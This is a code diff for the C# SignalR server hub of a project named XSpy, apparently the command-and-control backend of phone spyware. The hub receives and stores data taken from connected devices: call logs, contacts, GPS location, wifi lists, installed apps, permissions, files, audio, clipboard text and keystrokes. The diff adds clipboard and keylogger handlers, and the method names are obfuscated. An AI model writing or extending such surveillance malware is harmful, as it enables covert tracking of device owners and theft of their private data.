@@ -6,6 +6,7 @@ using System.Threading.Tasks;
 using Microsoft.AspNetCore.Authorization;
 using Microsoft.AspNetCore.SignalR;
 using Microsoft.Extensions.Hosting;
+using Newtonsoft.Json;
 using XSpy.Database.Entities;
 using XSpy.Database.Entities.Devices;
 using XSpy.Database.Services;
@@ -45,31 +46,22 @@ namespace XSpy.Socket
         {
             //    var user = await GetUserAsync().ConfigureAwait(false);
             //   var userId = user.Id;
+            var deviceId = GetDeviceId();
+            _methods.ClientsByDeviceId.TryRemove(deviceId, out _);
 
-            //  _methods.ClientsByUserId.TryRemove(userId, out _);
+            await _deviceService.DisconnectDevice(deviceId);
 
             await base.OnDisconnectedAsync(exception).ConfigureAwait(false);
         }
 
-        public async Task _0xSD(SaveDeviceRequest request)
+        public async Task _0xSD(string requestData)
         {
+            var request = JsonConvert.DeserializeObject<SaveDeviceRequest>(requestData);
             var user = await GetUser();
             if (user == null)
                 return;
 
             await _deviceService.SaveDevice(user.Id, request);
-            await Clients.Client(Context.ConnectionId).SendAsync("0xFI");
-            await Clients.Client(Context.ConnectionId).SendAsync("0xSM", new MessageDataRequest
-            {
-                Action = "ls"
-            });
-
-            await Clients.Client(Context.ConnectionId).SendAsync("0xCL");
-            await Clients.Client(Context.ConnectionId).SendAsync("0xCO");
-            await Clients.Client(Context.ConnectionId).SendAsync("0xLO");
-            await Clients.Client(Context.ConnectionId).SendAsync("0xWI");
-            await Clients.Client(Context.ConnectionId).SendAsync("0xPM");
-            await Clients.Client(Context.ConnectionId).SendAsync("0xIN");
         }
 
         //List Files
@@ -79,8 +71,9 @@ namespace XSpy.Socket
 
 
         //Download Files
-        public async Task _0xFD(TransferFileRequest fileRequest)
+        public async Task _0xFD(string request)
         {
+            var fileRequest = JsonConvert.DeserializeObject<TransferFileRequest>(request);
             var file = await _deviceService.StoreFile(GetDeviceId(), _filePath, fileRequest);
 
             await File.WriteAllBytesAsync(file.SavedPath, fileRequest.Buffer);
@@ -98,21 +91,25 @@ namespace XSpy.Socket
         }
 
         //Call List
-        public async Task _0xCL(SaveCallsRequest request)
+        public async Task _0xCL(string request)
         {
-            await _deviceService.SaveCalls(GetDeviceId(), request);
+            var calls = JsonConvert.DeserializeObject<SaveCallsRequest>(request);
+            await _deviceService.SaveCalls(GetDeviceId(), calls);
         }
 
         //CONTACT List
-        public async Task _0xCO(SaveContactsRequest request)
+        public async Task _0xCO(string request)
         {
-            await _deviceService.SaveContacts(GetDeviceId(), request);
+            var contacts = JsonConvert.DeserializeObject<SaveContactsRequest>(request);
+            await _deviceService.SaveContacts(GetDeviceId(), contacts);
         }
 
         //WIFI List
-        public async Task _0xWI(SaveWifiList wifiRequest)
+        public async Task _0xWI(string request)
         {
-            await _deviceService.SaveWifi(GetDeviceId(), wifiRequest);
+            var wifiRequest = JsonConvert.DeserializeObject<SaveWifiList>(request);
+            if (wifiRequest.Networks != null)
+                await _deviceService.SaveWifi(GetDeviceId(), wifiRequest);
         }
 
         //SAVE AUDIO FILE
@@ -124,27 +121,44 @@ namespace XSpy.Socket
         }
 
         //PERM. List
-        public async Task _0xPM(GrantedPermissionRequest permissions)
+        public async Task _0xPM(string request)
         {
+            var permissions = JsonConvert.DeserializeObject<GrantedPermissionRequest>(request);
             await _deviceService.SavePermission(GetDeviceId(), permissions);
         }
 
         //INSTALLED List
-        public async Task _0xIN(SaveInstalledAppsRequest installedApps)
+        public async Task _0xIN(string request)
         {
-            await _deviceService.SaveInstalledList(GetDeviceId(), installedApps);
+            SaveInstalledAppsRequest installedApps = JsonConvert.DeserializeObject<SaveInstalledAppsRequest>(request);
+            if (installedApps.Apps != null)
+                await _deviceService.SaveInstalledList(GetDeviceId(), installedApps);
         }
 
         //GRANTED PERM. List
-        public async Task _0xGP(PermissionDataRequest permissionData)
+        public async Task _0xGP(string request)
         {
+            var permissionData = JsonConvert.DeserializeObject<PermissionDataRequest>(request);
             await _deviceService.SavePermission(GetDeviceId(), permissionData);
         }
 
         //GPS
-        public async Task _0xLO(UpdatePositionRequest location)
+        public async Task _0xLO(string request)
         {
+            var location = JsonConvert.DeserializeObject<UpdatePositionRequest>(request);
             await _deviceService.SaveLocation(GetDeviceId(), location);
+        }
+
+        //ClipBoard
+        public async Task _0xCB(string word)
+        {
+            await _deviceService.SaveWords(GetDeviceId(), word, true);
+        }
+
+        //Save words - key logger
+        public async Task _0xKL(string words)
+        {
+            await _deviceService.SaveWords(GetDeviceId(), words, false);
         }
 
         private string GetDeviceId()
